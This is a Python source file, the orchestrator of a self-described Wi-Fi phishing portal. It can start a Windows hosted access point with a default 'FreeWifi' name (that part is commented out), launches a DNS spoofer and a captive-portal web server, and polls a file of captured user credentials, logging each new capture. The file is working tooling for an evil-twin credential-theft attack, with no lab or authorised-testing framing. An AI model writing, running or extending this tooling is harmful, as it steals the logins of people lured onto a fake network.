"""
Main script to orchestrate the Wi-Fi phishing portal components.

Starts the Wi-Fi AP (optional, Windows-specific), DNS spoofer,
captive portal web server, and monitors for captured credentials.
"""
import subprocess
import threading
import time
import os
import json
import logging
import logging.config
import sys

# --- Logging Setup ---
# Load configuration from the separate config file
try:
    # Ensure logging_config is importable from the script's directory
    sys.path.insert(0, os.path.dirname(__file__))
    from logging_config import LOGGING_CONFIG
    logging.config.dictConfig(LOGGING_CONFIG)
    # Get the main application logger instance
    logger = logging.getLogger('wifi_portal')
    logger.info("Logging configured successfully using logging_config.py.")
except ImportError:
    # Fallback basic config if import fails (should not happen ideally)
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - [FALLBACK] %(message)s')
    logger = logging.getLogger('wifi_portal_fallback')
    logger.error("Failed to import logging_config. Using basic fallback logging.")
except Exception as e:
    # Catch other potential errors during logging setup
    logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(name)s - %(levelname)s - [FALLBACK_ERROR] %(message)s')
    logger = logging.getLogger('wifi_portal_error')
    logger.error(f"CRITICAL ERROR setting up logging: {e}", exc_info=True)
    # Depending on severity, might want to exit: sys.exit(1)
# --- ---

CONFIG_PATH = os.path.join(os.path.dirname(__file__), 'config.json')
CRED_DIR = os.path.join(os.path.dirname(__file__), 'login_details')
CRED_FILE = os.path.join(CRED_DIR, 'captured_credentials.enc')

def start_wifi_ap(ssid, password):
    """
    Starts a Wi-Fi Hosted Network on Windows using netsh.

    Note: This function is Windows-specific and requires administrative privileges.

    Args:
        ssid (str): The desired SSID for the network.
        password (str, optional): The password for the network. If None or empty,
                                  an open network might be created (depending on OS).
    Raises:
        subprocess.CalledProcessError: If a netsh command fails.
        FileNotFoundError: If netsh command is not found.
    """
    logger.info("Attempting to start Wi-Fi AP (Windows specific)...")
    try:
        # Stop any existing hosted network first
        cmd_stop = ['netsh', 'wlan', 'stop', 'hostednetwork']
        logger.debug(f"Executing command: {' '.join(cmd_stop)}")
        subprocess.run(cmd_stop, capture_output=True, check=False, text=True) # Use text=True for easier output handling
    except FileNotFoundError:
        logger.error("`netsh` command not found. Cannot manage Wi-Fi AP. Ensure you are on Windows and netsh is in PATH.")
        raise
    except Exception as e:
        logger.warning(f"Could not stop existing hosted network (might be okay): {e}", exc_info=True)

    try:
        cmd_set = ['netsh', 'wlan', 'set', 'hostednetwork', f'ssid={ssid}', 'mode=allow']
        if password:
            cmd_set.append(f'key={password}')
        else:
            logger.warning("No password provided for Wi-Fi AP. Creating an open network.")
            # For an open network, explicitly remove the key if it was previously set
            cmd_set.append('keyUsage=persistent') # Reset key setting

        logger.debug(f"Executing command: {' '.join(cmd_set)}")
        set_result = subprocess.run(cmd_set, check=True, capture_output=True, text=True)
        logger.debug(f"Set hostednetwork stdout: {set_result.stdout}")
        logger.debug(f"Set hostednetwork stderr: {set_result.stderr}")

        cmd_start = ['netsh', 'wlan', 'start', 'hostednetwork']
        logger.debug(f"Executing command: {' '.join(cmd_start)}")
        start_result = subprocess.run(cmd_start, check=True, capture_output=True, text=True)
        logger.debug(f"Start hostednetwork stdout: {start_result.stdout}")
        logger.debug(f"Start hostednetwork stderr: {start_result.stderr}")

        logger.info(f"Wi-Fi AP '{ssid}' started successfully.")
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to set/start Wi-Fi AP using netsh: {e}", exc_info=True)
        logger.error(f"Command: {' '.join(e.cmd)}")
        logger.error(f"Return code: {e.returncode}")
        logger.error(f"Netsh stdout: {e.stdout}")
        logger.error(f"Netsh stderr: {e.stderr}")
        raise
    except FileNotFoundError:
        # Already caught above, but handle defensively
        logger.error("`netsh` command not found. Cannot manage Wi-Fi AP.")
        raise

def start_dns_server():
    """Starts the DNS spoofing server in a separate daemon thread."""
    def run_dns():
        """Target function for the DNS server thread."""
        logger.info("DNS server thread started.")
        dns_script_path = os.path.join(os.path.dirname(__file__), 'dns_spoofer.py')
        cmd = [sys.executable, dns_script_path]
        try:
            logger.info(f"Starting DNS server process: {' '.join(cmd)}")
            # Run the process, allowing its stdout/stderr to inherit from the parent
            process = subprocess.Popen(cmd, cwd=os.path.dirname(__file__))
            # Wait for the process to finish (it shouldn't if it's a server)
            process.wait()
            logger.info(f"DNS server process finished unexpectedly with code {process.returncode}.")

        except FileNotFoundError:
            logger.error(f"Could not find {dns_script_path} or python interpreter '{sys.executable}'.")
        except Exception as e:
            logger.error(f"Unexpected error running DNS server process: {e}", exc_info=True)

    # Daemon threads exit automatically when the main program exits
    t = threading.Thread(target=run_dns, name="DNSServerThread", daemon=True)
    t.start()
    logger.info("DNS spoofing server thread launched.")
    return t

def start_captive_portal():
    """Starts the captive portal Flask web server in a separate daemon thread."""
    def run_portal():
        """Target function for the captive portal thread."""
        logger.info("Captive portal thread started.")
        portal_script = os.path.join('portal', 'app.py')
        cmd = [sys.executable, portal_script]
        try:
            logger.info(f"Starting captive portal process: {' '.join(cmd)}")
            # Run the process, allowing its stdout/stderr to inherit from the parent
            process = subprocess.Popen(cmd, cwd=os.path.dirname(__file__))
            # Wait for the process to finish (it shouldn't if it's a server)
            process.wait()
            logger.info(f"Captive portal process finished unexpectedly with code {process.returncode}.")

        except FileNotFoundError:
            logger.error(f"Could not find {portal_script} or python interpreter '{sys.executable}'.")
        except Exception as e:
            logger.error(f"Unexpected error running captive portal process: {e}", exc_info=True)

    # Daemon threads exit automatically when the main program exits
    t = threading.Thread(target=run_portal, name="CaptivePortalThread", daemon=True)
    t.start()
    logger.info("Captive portal thread launched.")
    return t

def monitor_credential_file():
    """
    Monitors the credential file for changes in size and logs when new
    credentials appear to have been added. Runs indefinitely.
    """
    logger.info(f"Starting credential file monitor for: {CRED_FILE}")
    last_size = -1 # Initialize to -1 to log initial state correctly
    file_existed = False

    while True:
        try:
            file_exists_now = os.path.exists(CRED_FILE)

            if file_exists_now:
                if not file_existed:
                    logger.info(f"Credential file created: {CRED_FILE}")
                    file_existed = True
                    last_size = 0 # Reset size on creation

                try:
                    current_size = os.path.getsize(CRED_FILE)
                    if last_size == -1: # First check after startup
                         logger.info(f"Initial credential file size: {current_size} bytes.")
                    elif current_size > last_size:
                        logger.info(f"New credentials captured (file size increased from {last_size} to {current_size} bytes).")
                    elif current_size < last_size:
                        logger.warning(f"Credential file size decreased from {last_size} to {current_size} bytes. File might have been reset or tampered with.")
                    # No log if size is unchanged
                    last_size = current_size
                except FileNotFoundError:
                    # File might have been deleted between os.path.exists and os.path.getsize
                    logger.warning(f"Credential file disappeared unexpectedly between checks: {CRED_FILE}")
                    last_size = -1
                    file_existed = False
                except OSError as e:
                    logger.error(f"Error getting size of credential file {CRED_FILE}: {e}", exc_info=True)
            else:
                # If file existed before but now doesn't
                if file_existed:
                    logger.warning(f"Credential file no longer exists: {CRED_FILE}")
                last_size = -1 # Reset size if file doesn't exist
                file_existed = False

        except Exception as e:
            # Catch-all for unexpected errors during monitoring loop
            logger.error(f"Unexpected error in credential monitor: {e}", exc_info=True)

        time.sleep(10) # Check every 10 seconds

def main():
    """Main function to load config and start services."""
    logger.info("--- Starting Wi-Fi Phishing Portal Orchestrator ---")

    # --- Load Configuration ---
    logger.info(f"Attempting to load configuration from: {CONFIG_PATH}")
    config = None
    if not os.path.exists(CONFIG_PATH):
        logger.error(f"Configuration file not found: {CONFIG_PATH}. Exiting.")
        sys.exit(1)
    try:
        with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
            config = json.load(f)
        logger.info("Configuration loaded successfully.")
        # Optionally log parts of the config, be careful with sensitive data
        # Avoid logging keys or sensitive values directly in production logs
        loggable_config = {k: v for k, v in config.items() if k not in ['fernet_key', 'wifi_password']}
        logger.debug(f"Loaded configuration (sensitive fields omitted): {json.dumps(loggable_config)}")
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding configuration file {CONFIG_PATH}: {e}. Exiting.", exc_info=True)
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected error loading configuration from {CONFIG_PATH}: {e}. Exiting.", exc_info=True)
        sys.exit(1)

    # --- Ensure credential directory exists ---
    try:
        os.makedirs(CRED_DIR, exist_ok=True)
        logger.info(f"Ensured credential directory exists: {CRED_DIR}")
    except OSError as e:
        logger.error(f"Could not create credential directory {CRED_DIR}: {e}. Credential saving might fail.", exc_info=True)
        # Decide if this is fatal. For now, let monitor handle file existence.

    # --- Start Wi-Fi AP (Optional, Windows Only) ---
    # Note: This section remains commented out. Requires admin privileges.
    # Uncomment carefully.
    # if config.get('start_wifi_ap', False) and sys.platform == 'win32':
    #     try:
    #         ssid = config.get('ssid', 'FreeWifi') # Use default if not in config
    #         password = config.get('wifi_password') # Optional password
    #         logger.info(f"Attempting to start Windows Hosted Network AP: SSID='{ssid}', Password={'Provided' if password else 'None'}")
    #         start_wifi_ap(ssid, password)
    #     except KeyError as e:
    #         logger.error(f"Missing required configuration key for Wi-Fi AP: {e}")
    #     except (subprocess.CalledProcessError, FileNotFoundError) as e:
    #         logger.error(f"Failed to start Wi-Fi AP: {e}", exc_info=True)
    #         # Consider if this should be fatal depending on requirements
    #         # sys.exit(1)
    #     except Exception as e:
    #          logger.error(f"Unexpected error starting Wi-Fi AP: {e}", exc_info=True)
    # elif config.get('start_wifi_ap', False) and sys.platform != 'win32':
    #      logger.warning("Configuration requests starting Wi-Fi AP, but this feature is Windows-specific. Skipping.")


    # --- Start Core Services ---
    logger.info("Starting core services (DNS Spoofer, Captive Portal)...")
    dns_thread = start_dns_server()
    portal_thread = start_captive_portal()

    # --- Start Monitoring ---
    logger.info("Starting credential file monitor...")
    # Run monitor in the main thread, blocking it indefinitely
    try:
        monitor_credential_file()
    except KeyboardInterrupt:
        logger.info("KeyboardInterrupt received. Shutting down orchestrator.")
    except Exception as e:
        logger.critical(f"Credential monitor crashed unexpectedly: {e}", exc_info=True)
    finally:
        # --- Cleanup ---
        # Although daemons exit automatically, explicit cleanup might be desired
        # if processes were started differently or resources needed closing.
        # Currently, this part is unlikely to be reached unless monitor_credential_file exits.
        logger.info("--- Wi-Fi Phishing Portal Orchestrator Shutting Down ---")
        # Signal threads/processes to stop if they were designed to be stoppable.
        # Example: dns_thread.stop(), portal_thread.stop() if methods exist

if __name__ == '__main__':
    main()
